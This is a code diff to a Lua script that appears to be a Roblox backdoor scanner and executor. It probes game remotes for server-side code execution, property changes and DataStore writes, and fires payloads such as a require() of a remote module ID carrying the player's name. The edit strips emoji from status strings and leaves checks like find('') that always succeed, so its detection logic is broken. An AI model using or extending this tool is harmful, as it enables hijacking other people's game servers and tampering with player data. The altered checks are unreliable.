@@ -422,7 +422,7 @@ local function testVulnerability(remote)
             Workspace:FindFirstChild(testId):Destroy()
             vulnerabilityFound = true
             vulnerabilityType = "代码执行"
-            exploitInfo = "✅ 完全代码执行 - 可以执行任意Lua代码"
+            exploitInfo = "完全代码执行 - 可以执行任意Lua代码"
             testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
         end
     end
@@ -449,7 +449,7 @@ local function testVulnerability(remote)
                 testObj:Destroy()
                 vulnerabilityFound = true
                 vulnerabilityType = "代码执行"
-                exploitInfo = "✅ 完全代码执行 - 可以执行任意Lua代码"
+                exploitInfo = "完全代码执行 - 可以执行任意Lua代码"
                 testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
             end
         end
@@ -479,7 +479,7 @@ local function testVulnerability(remote)
             if testPart.BrickColor == BrickColor.new("Bright red") then
                 vulnerabilityFound = true
                 vulnerabilityType = "属性修改"
-                exploitInfo = "⚠️ 属性修改权限 - 可以修改游戏对象属性"
+                exploitInfo = "属性修改权限 - 可以修改游戏对象属性"
                 testPayload = "workspace.Baseplate.BrickColor = BrickColor.new('Bright green')"
             end
         end
@@ -503,7 +503,7 @@ local function testVulnerability(remote)
         if success4 and result then
             vulnerabilityFound = true
             vulnerabilityType = "函数调用"
-            exploitInfo = "🔧 服务端函数调用 - 可以调用服务端函数"
+            exploitInfo = "服务端函数调用 - 可以调用服务端函数"
             testPayload = "game:GetService('Players'):GetChildren()"
         end
     end
@@ -523,7 +523,7 @@ local function testVulnerability(remote)
         if success5 then
             vulnerabilityFound = true
             vulnerabilityType = "模块加载"
-            exploitInfo = "📦 模块加载权限 - 可以加载模块，但需要正确ID"
+            exploitInfo = "模块加载权限 - 可以加载模块，但需要正确ID"
             testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
         end
     end
@@ -543,7 +543,7 @@ local function testVulnerability(remote)
         if success6 then
             vulnerabilityFound = true
             vulnerabilityType = "数据操作"
-            exploitInfo = "💾 数据存储权限 - 可以读写游戏数据"
+            exploitInfo = "数据存储权限 - 可以读写游戏数据"
             testPayload = "game:GetService('DataStoreService'):GetDataStore('Global'):SetAsync('Test','Hacked')"
         end
     end
@@ -563,7 +563,7 @@ local function testVulnerability(remote)
         if success7 then
             vulnerabilityFound = true
             vulnerabilityType = "特定脚本"
-            exploitInfo = "🎯 支持特定脚本 - 可以直接执行你的require脚本"
+            exploitInfo = "支持特定脚本 - 可以直接执行你的require脚本"
             testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
         end
     end
@@ -696,7 +696,7 @@ local function performScan(scanType)
         -- 检查是否有可以直接执行你的脚本的漏洞
         local canExecuteScript = false
         for _, vuln in ipairs(detectedVulnerabilities) do
-            if vuln.exploitInfo:find("✅") or vuln.exploitInfo:find("🎯") then
+            if vuln.exploitInfo:find("") or vuln.exploitInfo:find("") then
                 canExecuteScript = true
                 break
             end
@@ -746,8 +746,8 @@ local function executeScript()
         if success then
             successCount = successCount + 1
             -- 特别标记可以执行你脚本的漏洞
-            if scriptText:find("15267263357") and (vuln.exploitInfo:find("✅") or vuln.exploitInfo:find("🎯")) then
-                notify("✅ 你的脚本可能已通过 " .. vuln.name .. " 执行")
+            if scriptText:find("15267263357") and (vuln.exploitInfo:find("") or vuln.exploitInfo:find("")) then
+                notify("你的脚本可能已通过 " .. vuln.name .. " 执行")
             end
         else
             failCount = failCount + 1
